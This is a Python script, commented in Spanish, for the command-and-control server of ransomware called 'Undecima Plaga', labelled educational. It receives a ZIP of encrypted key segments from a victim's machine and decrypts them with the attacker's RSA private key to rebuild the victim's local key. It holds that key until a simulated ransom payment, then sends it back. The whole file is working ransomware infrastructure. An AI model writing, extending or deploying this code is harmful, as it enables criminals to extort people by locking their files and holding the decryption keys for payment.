#!/usr/bin/env python3

import socket
import zipfile
import os
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding


#  PROTOCOLO DE SOCKET (Griss)
def _recibir_exacto(sock, n):
    datos = b''
    while len(datos) < n:
        chunk = sock.recv(n - len(datos))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        datos += chunk
    return datos

def enviar_bytes(sock, data: bytes):
    longitud = len(data).to_bytes(4, 'big')
    sock.sendall(longitud + data)

def recibir_bytes(sock) -> bytes:
    longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
    return _recibir_exacto(sock, longitud)

#  CARGA DE LLAVE PRIVADA PERMANENTE
def cargar_privada_permanente(ruta):
    """Carga la llave privada del atacante para descifrar lo que mande la victima."""
    with open(ruta, 'rb') as f:
        return serialization.load_pem_private_key(
            f.read(), password=None, backend=default_backend()
        )

#  DESCIFRADO Y RECONSTRUCCION DE LLAVE PRIVADA LOCAL
def procesar_zip_y_descifrar(nombre_zip, privada_perm):
    """
    Abre el ZIP recibido del ransomware, descifra cada segmento en orden correcto y reconstruye la llave privada local de la victima.

    El ZIP contiene: seg0.bin, seg1.bin, seg2.bin...
    Cada segmento fue cifrado con RSA-OAEP usando la llave publica permanente.
    """
    llave_privada_local_bytes = b""
    with zipfile.ZipFile(nombre_zip, 'r') as af:
        num_segmentos = len(af.namelist())
        
        for i in range(num_segmentos):
            nombre = f"seg{i}.bin"
            
            if nombre in af.namelist():
                segmento_cifrado = af.read(nombre)
                segmento_claro = privada_perm.decrypt(
                    segmento_cifrado,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                llave_privada_local_bytes += segmento_claro
    return llave_privada_local_bytes

#  SERVIDOR PRINCIPAL
def crear_socket_servidor(puerto, ruta_privada):
    """
    Inicia el servidor C&C en modo escucha.
      1. Carga la llave privada permanente
      2. Espera conexion del ransomware
      3. Recibe el ZIP con los segmentos cifrados
      4. Descifra y reconstruye la llave privada local
      5. Espera confirmacion de pago
      6. Envia la llave privada local al ransomware
    """
    privada_perm = cargar_privada_permanente(ruta_privada)
    print(f"[+] Llave privada permanente cargada desde: {ruta_privada}")

    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind(('', int(puerto)))
    servidor.listen(1)

    print("="*60)
    print("  UNDECIMA PLAGA — Servidor C&C")
    print(f"  Esperando en el puerto {puerto}...")
    print("="*60)

    try:
        while True:
            cliente_soc, addr = servidor.accept()
            print(f"\n[+] Conexion establecida con la victima: {addr}")

            try:
                # Recibir ZIP con segmentos cifrados
                print("[+] Recibiendo paquete de llaves cifradas (.zip)...")
                zip_recibido = recibir_bytes(cliente_soc)

                nombre_zip_temp = "paquete_recibido.zip"
                with open(nombre_zip_temp, 'wb') as f:
                    f.write(zip_recibido)

                # Descifrar y reconstruir llave privada local
                llave_victima_pem = procesar_zip_y_descifrar(nombre_zip_temp, privada_perm)
                print("[OK] Llave privada local reconstruida y lista.")

                # Simular confirmacion de pago
                print("\n" + "="*60)
                print("  SITUACION: Archivos secuestrados.")
                input("  Presiona Enter para simular el PAGO y liberar la llave...")
                print("="*60)

                # Enviar llave privada local descifrada al ransomware
                enviar_bytes(cliente_soc, llave_victima_pem)
                print("[OK] Llave de liberacion enviada. Rescate procesado.")

                os.remove(nombre_zip_temp)

            except Exception as e:
                print(f"[!] Error con la conexion: {e}")
            finally:
                cliente_soc.close()
                print(f"[+] Conexion con {addr} cerrada.")

    #except KeyboardInterrupt:
        #print("\n[+] Servidor detenido.")
    finally:
        servidor.close()

if __name__ == "__main__":
    all_args = argparse.ArgumentParser(description="Undecima Plaga — Servidor C&C (educativo)")
    all_args.add_argument("-p", "--puerto",  required=True, help="Puerto donde escuchara el servidor")
    all_args.add_argument("--privada",       required=True, help="Ruta de la llave privada permanente (.pem)")
    args = all_args.parse_args()

    crear_socket_servidor(args.puerto, args.privada)
